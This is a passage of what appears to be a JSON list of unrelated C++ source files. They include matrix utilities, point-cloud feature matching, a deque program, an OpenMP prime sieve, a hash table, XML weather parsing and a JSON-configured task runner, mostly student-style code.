false;\n\t}\n\n\treturn true;\n}\n\n\nvoid printConsole(double** matrix, int& matrix_n, int& matrix_m) {\n\tfor (int i{ 0 }; i < matrix_n; i++) {\n\t\tfor (int j{ 0 }; j < matrix_m; j++) {\n\t\t\tcout << matrix[i][j] << \"  \";\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\nvoid writeToFile(const char* output, double** matrix, int& matrix_n, int& matrix_m) {\n\tofstream outputFile(output);\n\tif (!outputFile.is_open()) {\n\t\tcout << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0 \u00ef\u00f0\u00e8 \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00e8\u00e8 \u00f4\u00e0\u00e9\u00eb\u00e0 \u00e4\u00eb\u00ff \u00e7\u00e0\u00ef\u00e8\u00f1\u00e8\" << endl;\n\t}\n\telse {\n\t\tfor (int i{ 0 }; i < matrix_n; i++) {\n\t\t\tfor (int j{ 0 }; j< matrix_m; j++) {\n\t\t\t\toutputFile << matrix[i][j] << \"  \";\n\t\t\t}\n\t\t\toutputFile << endl;\n\t\t}\n\t\tcout << \"\u00d0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00ef\u00f0\u00ee\u00e3\u00f0\u00e0\u00ec\u00ec\u00fb \u00e7\u00e0\u00ef\u00e8\u00f1\u00e0\u00ed \u00e2 \u00f4\u00e0\u00e9\u00eb: \" << output << endl;\n\n\t}\n\toutputFile.close();\n}\n\n\nvoid freeMatrix(double**& matrix, int& matrix_n) {\n\tfor (int i{ 0 }; i < matrix_n; ++i) {\n\t\tdelete[] matrix[i];\n\t}\n\tdelete[] matrix;\n\tmatrix = nullptr;\n}\n",
    "#include \"valGenerationClass.h\"\nVALGENERATIONCLASS::VALGENERATIONCLASS()\n{\n   init = false;\n   frame_cnt = 0;\n   max_dist = 5.0;\n   voxelSize = 0.6;\n   downSizeFilterSurf.setLeafSize(voxelSize, voxelSize, voxelSize);\n}\nVALGENERATIONCLASS::~VALGENERATIONCLASS()\n{\n}\nvoid VALGENERATIONCLASS::print_matchedEdgeFeature(int frame_idx, int matched_idx, int *cnt, pcl::PointCloud<pcl::PointXYZI> *matched_pc, std::vector<int> *map_idx)\n{\n   if (frame_idx < 0 || matched_idx < 0)\n      return;\n   if (debugging)\n      fprintf(stderr, \"%f %f %f;\\n\", matchedEdgePC[frame_idx][matched_idx].x, matchedEdgePC[frame_idx][matched_idx].y, matchedEdgePC[frame_idx][matched_idx].z);\n\n   matched_pc->push_back(matchedEdgePC[frame_idx][matched_idx]);\n   map_idx->push_back(frame_idx);\n   if (matchedEdgeFeature[frame_idx][matched_idx] >= 0)\n   {\n      int prev_idx = matchedEdgeFeature[frame_idx][matched_idx];\n      *cnt = *cnt + 1;\n      print_matchedEdgeFeature(frame_idx - 1, prev_idx, cnt, matched_pc, map_idx);\n   }\n   else\n      return;\n}\nvoid VALGENERATIONCLASS::downSampling(const pcl::PointCloud<pcl::PointXYZI>::Ptr &surf_pc_in, pcl::PointCloud<pcl::PointXYZI>::Ptr &surf_pc_out)\n{\n   downSizeFilterSurf.setInputCloud(surf_pc_in);\n   downSizeFilterSurf.filter(*surf_pc_out);\n}\nvoid VALGENERATIONCLASS::print_matchedSurfFeature(int frame_idx, int matched_idx, int *cnt, pcl::PointCloud<pcl::PointXYZI> *matched_pc, std::vector<int> *map_idx)\n{\n   if (frame_idx < 0 || matched_idx < 0)\n      return;\n   // fprintf(stderr, \"%f %f %f;\\n\", matchedEdgePC[frame_idx][matched_idx].x, matchedEdgePC[frame_idx][matched_idx].y, matchedEdgePC[frame_idx][matched_idx].z);\n\n   matched_pc->push_back(matchedSurfPC[frame_idx][matched_idx]);\n   map_idx->push_back(frame_idx);\n   if (matchedSurfFeature[frame_idx][matched_idx] >= 0)\n   {\n      int prev_idx = matchedSurfFeature[frame_idx][matched_idx];\n      *cnt = *cnt + 1;\n      print_matchedSurfFeature(frame_idx - 1, prev_idx, cnt, matched_pc, map_idx);\n   }\n   else\n      return;\n}\nvoid VALGENERATIONCLASS::surfFeatureMatch(pcl::PointCloud<pcl::PointXYZI>::Ptr &pc_out_map, pcl::PointCloud<pcl::PointXYZI>::Ptr &pc_out_matched)\n{\n\n   surfPair.clear();\n   if (globalSurfMap.size() > 0 && localSurfMap.size() > 0)\n   {\n      fprintf(stderr, \"globalSurfMap thread\\n\");\n\n      /*ORB\ub97c \uc704\ud55c FLANN \uc124\uc815\uac12*/\n      const static auto indexParams = new cv::flann::IndexParams();\n      indexParams->setAlgorithm(cvflann::FLANN_INDEX_LSH);\n      indexParams->setInt(\"table_number\", 6);\n      indexParams->setInt(\"key_size\", 12);\n      indexParams->setInt(\"multi_probe_level\", 1);\n\n      const static auto searchParams = new cv::flann::SearchParams();\n      searchParams->setInt(\"checks\", 50);\n\n      /*match features between two surf*/\n      int localMapSize = (int)localSurfMap.size();\n      for (int i = 0; i < localMapSize; i++)\n      {\n\n         // local data\n         cv::Mat descriptor_curr = std::get<1>(localSurfMap[i]);\n         pcl::PointCloud<pcl::PointXYZI> pc_curr = std::get<2>(localSurfMap[i]);\n         int globalMapSize = (int)globalSurfMap.size();\n         for (int j = globalMapSize - 1; j < globalMapSize; j++)\n         {\n            // map data\n            cv::Mat descriptor_prev = std::get<1>(globalSurfMap[j]);\n            pcl::PointCloud<pcl::PointXYZI> pc_prev = std::get<2>(globalSurfMap[j]);\n\n            // matching based flann\n            const static auto flann = cv::FlannBasedMatcher(indexParams, searchParams);\n            std::vector<std::vector<cv::DMatch>> matches;\n            flann.knnMatch(descriptor_prev, descriptor_curr, matches, 2);\n            const float ratio_thresh = 0.50f;\n            std::vector<cv::DMatch> good;\n            good.clear();\n            for (const auto &mn : matches)\n            {\n               if (mn.size() < 2)\n                  continue;\n               if (mn[0].distance < ratio_thresh * mn[1].distance)\n               {\n                  good.push_back(mn[0]);\n                  matchedSurfFeature[frame_cnt - 1][mn[0].trainIdx] = mn[0].queryIdx;\n               }\n            }\n            // draw matching result\n            if (debugging && good.size() > 0)\n            {\n               std::vector<cv::KeyPoint> keypoints_curr = std::get<0>(localSurfMap[i]);\n               cv::Mat img_curr = std::get<3>(localSurfMap[i]);\n               std::vector<cv::KeyPoint> keypoints_prev = std::get<0>(globalSurfMap[j]);\n               cv::Mat img_prev = std::get<3>(globalSurfMap[j]);\n               cv::Mat resultMat;\n               drawMatches(img_prev, keypoints_prev, img_curr, keypoints_curr, good, resultMat, cv::Scalar::all(-1), cv::Scalar::all(-1),\n                           std::vector<char>(), cv::DrawMatchesFlags::NOT_DRAW_SINGLE_POINTS);\n               char windowname[250];\n               sprintf(windowname, \"surf curr[%d]-prev[%d]\", i, j);\n               cv::imshow(windowname, resultMat);\n               cv::waitKey(1);\n            }\n         }\n         pcl::PointCloud<pcl::PointXYZI> curr_frame_pc;\n ",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint front=-1;\r\nint rear=-1;\r\nint size=21;\r\nint dqueue[21];\r\n\r\nvoid finsert()\r\n{\r\n     if((front==0) && (rear==size-1))\r\n     {\r\n          cout<<\"Queue is OVERFLOW\";\r\n     }\r\n     \r\n     // if (front==-1)\r\n     // {\r\n     //      int elem;\r\n     //      cout<<\"ENTER ELEMENT TO INSERT FROM FRONT :\";\r\n     //      cin>>elem;\r\n     //      cout<<\"\\n\";\r\n\r\n     //      front++;\r\n     //      rear=0;\r\n     //      dqueue[front]=elem;\r\n\r\n// from the front of the elemnt of the sa\r\n          \r\n     \r\n     if(front==0)\r\n     {\r\n          cout<<\"\\nINSERTION FROM FRONT NOT POSSIBLE\";\r\n     }\r\n     else\r\n     {\r\n          int elem;\r\n          cout<<\"ENTER ELEMENT TO INSERT FROM FRONT :\";\r\n          cin>>elem;\r\n          cout<<\"\\n\";\r\n\r\n          front--;\r\n          // rear=0;\r\n          dqueue[front]=elem;\r\n     \r\n     }\r\n}\r\n\r\nvoid rinsert()\r\n{\r\n     if((front==0) && (rear==size-1))\r\n     {\r\n          cout<<\"Queue is OVERFLOW\";\r\n     }\r\n     else\r\n     {\r\n          int elem;\r\n          cout<<\"ENTER ELEMENT TO INSERT FROM LAST :\";\r\n          cin>>elem;\r\n          cout<<\"\\n\";\r\n\r\n          rear++;\r\n          front=0;\r\n          dqueue[rear]=elem;\r\n     }\r\n\r\n}\r\n\r\nvoid fdelete()\r\n{\r\n     if((front==-1)||(front==rear+1))\r\n     {\r\n          cout<<\"QUEUE IS UNDERFLOW...!!\";\r\n     }\r\n     else\r\n     {\r\n          cout<<dqueue[front]<<\" REMOVED SUCCESSFULLY....!!\\n\";\r\n          front++;\r\n     }\r\n     if(front==rear+1)\r\n     {\r\n          front=-1;\r\n          rear=-1;\r\n     }\r\n}\r\n\r\nvoid rdelete()\r\n{\r\n     if((front==-1)||(front==rear+1))\r\n     {\r\n          cout<<\"\\n QUEUE IS UNDERFLOW...!!\";\r\n     }\r\n     else\r\n     {\r\n          cout<<dqueue[rear]<<\" REMOVED SUCCESSFULLY...!!\\n\";\r\n          rear--;\r\n     }\r\n     if(front==rear+1)\r\n     {\r\n          front=-1;\r\n          rear=-1;\r\n     }\r\n}\r\nvoid display()\r\n{\r\n     if((front==-1)||(front==rear+1))\r\n     {\r\n          cout<<\"QUEUE IS UNDERFLOW...!!\";\r\n     }\r\n     else\r\n     {\r\n          int i=front;\r\n          cout<<\"TOTAL ELEMENT : \";\r\n          for(;i<=rear;i++)\r\n          {\r\n               cout<<\" \"<<dqueue[i];\r\n          }\r\n     }\r\n}\r\nvoid peek()\r\n{\r\n     if ((front==-1)|| (front==rear+1))\r\n     {\r\n          cout<<\"\\nNO ELEMENT FOUND...!\";\r\n     }\r\n     else\r\n     {\r\n          cout<<\"\\n The First Element is : \"<<dqueue[front]<<endl;\r\n     }\r\n}\r\n\r\nint main()\r\n{\r\n     cout<<\"\\n\\n.......................QUEUE IMPLEMENTATION...................... \"<<endl;\r\n\r\n     cout<<\"\\n\\tQUEUE OPERATIONS :\"<<endl;\r\n     cout<<\"1.INSERT from FRONT\";\r\n     cout<<\"\\n2.INSERT from LAST\";\r\n     cout<<\"\\n3.DELETE from FRONT\";\r\n     cout<<\"\\n4.DELETE from LAST\";\r\n     cout<<\"\\n5.PEEK\";\r\n     cout<<\"\\n6.DISPLAY\";\r\n     cout<<\"\\n7.EXIT\";\r\n     int opt;\r\n     again:\r\n     cout<<\"\\n\\n\\tSelect the Operations (1-4) :\";\r\n     cin>>opt;\r\n     switch (opt)\r\n     {\r\n     case 1:\r\n          finsert();\r\n          goto again;\r\n     \r\n     case 2:\r\n          rinsert();\r\n          goto again;\r\n     case 3:\r\n          fdelete();\r\n          goto again;\r\n     \r\n     case 4:\r\n          rdelete();\r\n          goto again;\r\n\r\n     case 5:\r\n          peek();\r\n          goto again;\r\n     \r\n     case 6:\r\n          display();\r\n          goto again;\r\n     \r\n     case 7:\r\n          cout<<\"\\n\\t\\t!!...OPERATION EXIT SUCCESFULLY....!!\";\r\n          break;\r\n     \r\n     default:\r\n          cout<<\"\\n\\t\\t...!!..INVALID INPUT...!!..\";\r\n          goto again;\r\n     }\r\n\r\n\r\nreturn 0;\r\n}",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <omp.h> // OpenMP - \u0431\u0456\u0431\u043b\u0456\u043e\u0442\u0435\u043a\u0430 \u0434\u043b\u044f \u043f\u0430\u0440\u0430\u043b\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u0443\u0432\u0430\u043d\u043d\u044f\n#include <chrono> // \u0411\u0456\u0431\u043b\u0456\u043e\u0442\u0435\u043a\u0430 \u0434\u043b\u044f \u0432\u0438\u043c\u0456\u0440\u044e\u0432\u0430\u043d\u043d\u044f \u0447\u0430\u0441\u0443\n\nusing namespace std;\n\nint main(int argc, char* argv[]) {\n    // \u041f\u0435\u0440\u0435\u0432\u0456\u0440\u043a\u0430 \u043a\u0456\u043b\u044c\u043a\u043e\u0441\u0442\u0456 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u0456\u0432 \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0433\u043e \u0440\u044f\u0434\u043a\u0430\n    if (argc != 2) {\n        cerr << \"\u0412\u0438\u043a\u043e\u0440\u0438\u0441\u0442\u0430\u043d\u043d\u044f: \" << argv[0] << \" \u043a\u0456\u043b\u044c\u043a\u0456\u0441\u0442\u044c_\u043f\u043e\u0442\u043e\u043a\u0456\u0432\" << endl;\n        return 1;\n    }\n\n    // \u0412\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u043d\u044f \u043a\u0456\u043b\u044c\u043a\u043e\u0441\u0442\u0456 \u043f\u043e\u0442\u043e\u043a\u0456\u0432 OpenMP\n    int num_threads = atoi(argv[1]); // \u041a\u0456\u043b\u044c\u043a\u0456\u0441\u0442\u044c \u043f\u043e\u0442\u043e\u043a\u0456\u0432 \u0437 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u0443 \u043a\u043e\u043c\u0430\u043d\u0434\u043d\u043e\u0433\u043e \u0440\u044f\u0434\u043a\u0430\n    omp_set_num_threads(num_threads);\n\n    int n;\n    cout << \"\u0412\u0432\u0435\u0434\u0456\u0442\u044c \u0432\u0435\u0440\u0445\u043d\u044e \u043c\u0435\u0436\u0443 \u043f\u043e\u0448\u0443\u043a\u0443 \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0447\u0438\u0441\u0435\u043b: \";\n    cin >> n;\n\n    // \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u0432\u0435\u043a\u0442\u043e\u0440\u0443, \u0449\u043e\u0431 \u0432\u043a\u0430\u0437\u0430\u0442\u0438, \u0447\u0438 \u0454 \u0447\u0438\u0441\u043b\u043e \u043f\u0440\u043e\u0441\u0442\u0438\u043c\n    vector<bool> is_prime(n+1, true);\n    is_prime[0] = is_prime[1] = false; // 0 \u0442\u0430 1 \u043d\u0435 \u0454 \u043f\u0440\u043e\u0441\u0442\u0438\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438\n\n    auto start = chrono::high_resolution_clock::now(); // \u041f\u043e\u0447\u0430\u0442\u043e\u043a \u0432\u0438\u043c\u0456\u0440\u044e\u0432\u0430\u043d\u043d\u044f \u0447\u0430\u0441\u0443\n\n    int sqrt_n = sqrt(n);\n    // \u041f\u0430\u0440\u0430\u043b\u0435\u043b\u044c\u043d\u0438\u0439 \u0446\u0438\u043a\u043b \u0434\u043b\u044f \u0432\u0438\u0437\u043d\u0430\u0447\u0435\u043d\u043d\u044f \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0447\u0438\u0441\u0435\u043b \u0432\u0456\u0434 2 \u0434\u043e sqrt(n)\n    #pragma omp parallel for schedule(dynamic, 256)\n    for (int p = 2; p <= sqrt_n; p++) {\n        if (is_prime[p]) {\n            // \u0412\u0456\u0434\u043c\u0456\u0447\u0435\u043d\u043d\u044f \u0432\u0441\u0456\u0445 \u043a\u0440\u0430\u0442\u043d\u0438\u0445 \u043f\u043e\u0442\u043e\u0447\u043d\u043e\u0433\u043e \u043f\u0440\u043e\u0441\u0442\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u044f\u043a \u043d\u0435\u043f\u0440\u043e\u0441\u0442\u0438\u0445\n            for (int multiple = p * p; multiple <= n; multiple += p) {\n                #pragma omp critical\n                is_prime[multiple] = false;\n            }\n        }\n    }\n\n    vector<int> primes; // \u0412\u0435\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0437\u0431\u0435\u0440\u0456\u0433\u0430\u043d\u043d\u044f \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0447\u0438\u0441\u0435\u043b\n\n    // \u041f\u0430\u0440\u0430\u043b\u0435\u043b\u044c\u043d\u0430 \u043e\u0431\u0440\u043e\u0431\u043a\u0430 \u0434\u043b\u044f \u0437\u043d\u0430\u0445\u043e\u0434\u0436\u0435\u043d\u043d\u044f \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0447\u0438\u0441\u0435\u043b \u0432\u0456\u0434 2 \u0434\u043e n\n    #pragma omp parallel\n    {\n        vector<int> local_primes; // \u041b\u043e\u043a\u0430\u043b\u044c\u043d\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440 \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0447\u0438\u0441\u0435\u043b \u0434\u043b\u044f \u043a\u043e\u0436\u043d\u043e\u0433\u043e \u043f\u043e\u0442\u043e\u043a\u0443\n        // \u0426\u0438\u043a\u043b \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u0456\u0440\u043a\u0438 \u043f\u0440\u043e\u0441\u0442\u043e\u0442\u0438 \u0447\u0438\u0441\u0435\u043b \u0442\u0430 \u0457\u0445 \u0434\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f \u0432 \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n        #pragma omp for nowait\n        for (int i = 2; i <= n; i++) {\n            if (is_prime[i]) {\n                local_primes.push_back(i);\n            }\n        }\n        // \u041a\u0440\u0438\u0442\u0438\u0447\u043d\u0430 \u0441\u0435\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u0431\u0435\u0437\u043f\u0435\u0447\u043d\u043e\u0433\u043e \u0434\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0447\u0438\u0441\u0435\u043b \u0437 \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0432\u0435\u043a\u0442\u043e\u0440\u0430 \u0432 \u0437\u0430\u0433\u0430\u043b\u044c\u043d\u0438\u0439\n        #pragma omp critical\n        primes.insert(primes.end(), local_primes.begin(), local_primes.end());\n    }\n\n    // \u0412\u0438\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u043f\u0440\u043e\u0441\u0442\u0438\u0445 \u0447\u0438\u0441\u0435\u043b \u043d\u0430 \u0435\u043a\u0440\u0430\u043d\n    for (int prime : primes) {\n        cout << prime << \" \";\n    }\n    cout << endl;\n\n    auto stop = chrono::high_resolution_clock::now(); // \u041a\u0456\u043d\u0435\u0446\u044c \u0432\u0438\u043c\u0456\u0440\u044e\u0432\u0430\u043d\u043d\u044f \u0447\u0430\u0441\u0443\n    auto duration = chrono::duration_cast<chrono::milliseconds>(stop - start); // \u041e\u0431\u0447\u0438\u0441\u043b\u0435\u043d\u043d\u044f \u0442\u0440\u0438\u0432\u0430\u043b\u043e\u0441\u0442\u0456\n    cout << \"\u0427\u0430\u0441 \u0432\u0438\u043a\u043e\u043d\u0430\u043d\u043d\u044f: \" << duration.count() << \" \u043c\u0441\\n\"; // \u0412\u0438\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u0442\u0440\u0438\u0432\u0430\u043b\u043e\u0441\u0442\u0456 \u0443 \u043c\u0456\u043b\u0456\u0441\u0435\u043a\u0443\u043d\u0434\u0430\u0445\n\n    return 0;\n}\n",
    "// ====================================================\r\n// Your name: Nathaniel VandenBerg\r\n// Complier:  g++\r\n// File type: htable.cpp implementation file\r\n//=====================================================\r\n\r\n#include \"htable.h\"\r\n#include<fstream>\r\n#include <cassert>\r\n\r\n\r\n/**\r\n * @brief Constructor to create an empty hash table\r\n * @param size The number of buckets in the hash table\r\n */\r\nHashTable::HashTable(int size) {\r\n\t//cout << \">HashTable(int);\";\r\n\ttable_size = size;//default size is 23\r\n\ttable = vector<LinkedList>(table_size);\r\n}\r\n\r\n/**\r\n * @brief Destructor\r\n */\r\nHashTable::~HashTable() {\r\n\tcout << \"\\n\\n>~HashTable();\\n\";\r\n\ttable.clear();//clear out the vector\r\n}\r\n/**\r\n * @brief  Get the hash key of the order\r\n * @return int The hashed index of the order ID\r\n */\r\nint HashTable::hash(int id) {\r\n\t//cout << \">hash();=\"<< id % table_size << \"| \";\r\n\treturn id % table_size;\r\n}\r\n\r\n/**\r\n * @brief Find an order by its ID\r\n * @param id: the order ID\r\n * @param order: the reference to stored found order (if found)\r\n * @return true if found, false otherwise\r\n */\r\nbool HashTable::findOrder(int id, Order& order) {\r\n\tcout << \"\\n>findOrder();\";\r\n\tcout << order;\r\n\tif (numOrders() == 0) {//if table is empty return false\r\n\t\treturn false;\r\n\t}\r\n\telse{\r\n\t\tint hashVal = hash(id);//vector index value\r\n\t\tOrder toFind = order;//copy of object Order\r\n\t\ttoFind.id = id;//update id to new value passed to function\r\n\t\tint pos = table[hashVal].search(toFind);//search the LL at the vector index\r\n\t\tif (pos == -1) {//if not in LL\r\n\t\t\tcout << \"->fail\";\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\telse\r\n\t\t\treturn true;\r\n\t}\r\n}\r\n\r\n/**\r\n * @brief Insert an order into the hash table. The order ID is used as the key.\r\n * A order is inserted only if its ID isn't in the table\r\n * @return true if inserted, false otherwise\r\n */\r\nbool HashTable::insertOrder(const Order& order) {\r\n\t//cout << \">insertOrder()\"; \r\n\tcout << order << endl;\r\n\tint hashVal = hash(order.id);//brief function to find order location in array\r\n\r\n\t//use this when table automatically increases in size based off of loadfactor\r\n\t//!!! warning !!! \r\n\t//this has causes problems when trying to rehash the table to a specific size\r\n\t/*if (loadFactor()) {//check the order count to bucket ratio\r\n\t\tint newSize = findNextPrime();//get next prime value for new table size\r\n\t\trehash(newSize);//if it greater than the loadFactor (.3) it should resize the vector\r\n\t}*/\r\n\r\n\tif (table[hashVal].search(order) == -1) {//If the bucket is empty or the ID is not a duplicate\r\n\t\ttable[hashVal].addRear(order);//add to the rear\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\n/**\r\n * @brief Load orders from a file\r\n * \r\n * @param file_name The name of the file to load\r\n */\r\nvoid HashTable::fillTable(string file_name) {\r\n\t// Open the file to read\r\n\t//cout << \">fillTable();\\n\";\r\n\tifstream fin;\r\n\tfin.open(file_name.c_str());\r\n\tif (!fin) {\r\n\t\tcout << \"Error opening file \" << file_name << endl;\r\n\t\treturn;\r\n\t}\r\n\tOrder order;//object Order created\r\n\twhile (fin >> order) {//while there not at the end of the file copy info to order\r\n\t\t//cout << endl << order;\r\n\t\tinsertOrder(order);//insert into table vector\r\n\t}\r\n\trehash(table_size);//use this when table automatically increases in size based off of loadfactor\r\n\tprintTable();\r\n}\r\n\r\n// \r\n/**\r\n * @brief Remove an order from the hash table. The order ID is used as the key.\r\n *        A order is removed only if its ID is in the table\r\n * \r\n * @param id \r\n * @return true if the order is removed, false otherwise\r\n */ \r\nbool HashTable::removeOrder(int id) {\r\n\tcout << \"\\n>removeOrder();\";//cout << \" id: \" << id << endl;\r\n\tif (numOrders() == 0) {//return false if vectro is empty\r\n\t\treturn false;\r\n\t}\r\n\telse {\r\n\t\tint hashVal = hash(id);//brief function to find order location in array\r\n\t\tOrder delOrder;//Order object must be created to reference in search\r\n\t\tdelOrder.id = id;//update Order X.id to id sent to function\r\n\t\tint pos = table[hashVal].search(delOrder);//search by ID value\r\n\t\tif (pos == -1) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\telse {\r\n\t\t\ttable[hashVal].deleteAt(pos, delOrder);\r\n\t\t\t//delOrder.printOrder();\r\n\t\t\tcout << delOrder;\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n}\r\n\r\n// Display the hash table\r\nvoid HashTable::printTable() {\r\n\tcout << \"\\n\\n>printTable();\\n\";\r\n\r\n\tfor (int i = 0; i < table_size; i++) {\r\n\t\tcout << \"Bucket \" << i << \": \";\r\n\t\ttable[i].displayAll();\r\n\t}\r\n}\r\n\r\n/**\r\n * @brief Get the total number of orders in the hash table\r\n * \r\n * @return int The number of orders in the hash table\r\n */\r\nint HashTable::numOrders() const {\r\n\t//cout << \">numOrders();\";\r\n\tint orderCount = 0;\r\n\tint i = 0;\r\n\tfor (auto j : table) {\r\n\t\torderCount += table[i].length();\r\n\t\ti++;\r\n\t}\r\n\t//cout << \" = \" << orderCount << \"| \";\r\n\treturn orderCount;\r\n}\r\n\r\n// Update the order in the hash table\r\n/**\r\n * @brief Update a order in the hash table. The order ID is used as the key.\r\n * \t\t  A order is updated only if its ID is in the table\r\n * @param order the new order that is used to update the old order \r\n * @return true if the order is",
    "#include <iostream>\n#include <string>\n#include \"/root/pr/profLab7/include/Service.h\"\n#include \"/root/pr/profLab7/include/WeatherService.h\"\n#include \"/root/pr/profLab7/lib/pugixml.hpp\"\nusing namespace std;\nusing namespace pugi;\n\nWeatherService XmlService::getWeather(string s){\n    xml_document doc;\n    xml_parse_result result = doc.load_file(s.c_str());\n    if (!result)\n        throw exception(\"error\");\n    xml_node node = doc.child(\"current\");\n    string city = node.child(\"city\").attribute(\"name\").as_string(); //  \u041a\u0438\u0440\u043e\u0432\n    double lon = node.child(\"city\").child(\"coord\").attribute(\"lon\").as_int(); // 49.6601\n    double lat = node.child(\"city\").child(\"coord\").attribute(\"lat\").as_int(); // 58.5966\n    double temperature = node.child(\"temperature\").attribute(\"temperature\").as_double(); // 5.69\n    string weather = node.child(\"weather\").attribute(\"weather\").as_string(); // \u0434\u043e\u0436\u0434\u044c\n    double windSpeed = node.child(\"temperature\").attribute(\"temperature\").as_double(); // 4.27\n    int clouds = node.child(\"clouds\").attribute(\"clouds\").as_int(); // 90\n    return Weather(city, lon, lat, temperature, weather, windSpeed, clouds);\n}\n",
    "#include <fstream>\r\n#include \"include/menu.hpp\"\r\n#include \"include/configor/json.hpp\"\r\n#include \"include/path.h\"\r\n#include \"include/inicpp.hpp\"\r\n\r\nusing namespace std;\r\nusing namespace path;\r\nusing namespace configor;\r\nusing namespace inicpp;\r\n\r\nstring self_path, self_name;\r\n\r\nclass Task {\r\npublic:\r\n\tstring path;\r\n\tsize_t trigger_count;\r\n\tclock_t trigger_interval;\r\n\tbool auto_trigger;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &task);\r\n\tinline void init(const string &p, const size_t &tc, const clock_t &ti, const bool &at);\r\n\r\n\tTask() { init(); }\r\n\tTask(const json::value &task) { init(task); }\r\n\tTask(const string &p, const size_t &tc, const clock_t &ti, const bool &at) { init(p, tc, ti, at); }\r\n\r\n\tvoid run();\r\n};\r\nclass Config {\r\npublic:\r\n\tclock_t interval_time, interval_eps;\r\n\tvector<Task> task;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &config);\r\n\tinline bool init(const string &config_path);\r\n\tinline void init(const clock_t &it, const clock_t &ie, const vector<Task> &t);\r\n\r\n\tConfig() { init(); }\r\n\tConfig(const json::value &config) { init(config); }\r\n\tConfig(const string config_path) { init(config_path); }\r\n\tConfig(const clock_t &it, const clock_t &ie, const vector<Task> &t) { init(it, ie, t); }\r\n\r\n\tjson::value toJson();\r\n};\r\n\r\ninline bool loadConfig(string path, json::value &data) {\r\n\tdata.clear();\r\n\tifstream file(path.c_str());\r\n\tif (!file.is_open()) return true;\r\n\ttry {\r\n\t\tfile >> json::wrap(data);\r\n\t} catch (exception &_ERROR_) { return true; }\r\n\tfile.close();\r\n\treturn false;\r\n}\r\ninline bool editConfig(string path, json::value data) {\r\n\tofstream file(path.c_str());\r\n\tif (!file.is_open()) return true;\r\n\ttry {\r\n\t\tfile << json::wrap(data);\r\n\t} catch (exception &_ERROR_) { return true; }\r\n\tfile.close();\r\n\treturn false;\r\n}\r\n\r\ninline void Task::init() {\r\n\tpath = \"\";\r\n\ttrigger_count = 1;\r\n\ttrigger_interval = 0;\r\n\tauto_trigger = true;\r\n}\r\ninline void Task::init(const json::value &task) {\r\n\tinit();\r\n\tpath = task[\"path\"];\r\n\tpathDelete(path);\r\n\tif (task.count(\"trigger_count\") > 0)\r\n\t\ttrigger_count = stol(task[\"trigger_count\"]);\r\n\tif (task.count(\"trigger_interval\") > 0)\r\n\t\ttrigger_interval = stol(task[\"trigger_interval\"]);\r\n\tif (task.count(\"auto_trigger\") > 0)\r\n\t\tauto_trigger = task[\"auto_trigger\"];\r\n}\r\ninline void Task::init(const string &p, const size_t &tc, const clock_t &ti, const bool &at) {\r\n\tinit();\r\n\tpath = p;\r\n\ttrigger_count = tc;\r\n\ttrigger_interval = ti;\r\n\tauto_trigger = at;\r\n}\r\n\r\ninline void Config::init() {\r\n\tinterval_time = 100;\r\n\tinterval_eps = 1000;\r\n\ttask.clear();\r\n}\r\ninline void Config::init(const json::value &config) {\r\n\tinit();\r\n\tinterval_time = stol(config[\"interval_time\"]);\r\n\tif (config.count(\"interval_eps\"))\r\n\t\tinterval_eps = stol(config[\"interval_eps\"]);\r\n\tif (config.count(\"task\") > 0) {\r\n\t\tfor (json::value subtask : config[\"task\"])\r\n\t\t\ttask.push_back(subtask);\r\n\t}\r\n}\r\ninline bool Config::init(const string &config_path) {\r\n\tjson::value config;\r\n\tbool is_failed = loadConfig(config_path, config);\r\n\tif (is_failed) return true;\r\n\r\n\tinit(config);\r\n\r\n\treturn false;\r\n}\r\ninline void Config::init(const clock_t &it, const clock_t &ie, const vector<Task> &t) {\r\n\tinit();\r\n\tinterval_time = it;\r\n\tinterval_eps = ie;\r\n\ttask = t;\r\n}\r\n\r\njson::value Config::toJson() {\r\n\tjson::value ret;\r\n\tret[\"interval_time\"] = to_string(interval_time);\r\n\tret[\"interval_eps\"] = to_string(interval_eps);\r\n\tfor (Task subtask : task) {\r\n\t\tret[\"task\"].push_back(json::object( {\r\n\t\t\t{\"path\", subtask.path},\r\n\t\t\t{\"trigger_count\", to_string(subtask.trigger_count)},\r\n\t\t\t{\"trigger_interval\", to_string(subtask.trigger_interval)},\r\n\t\t\t{\"auto_trigger\", subtask.auto_trigger}\r\n\t\t} 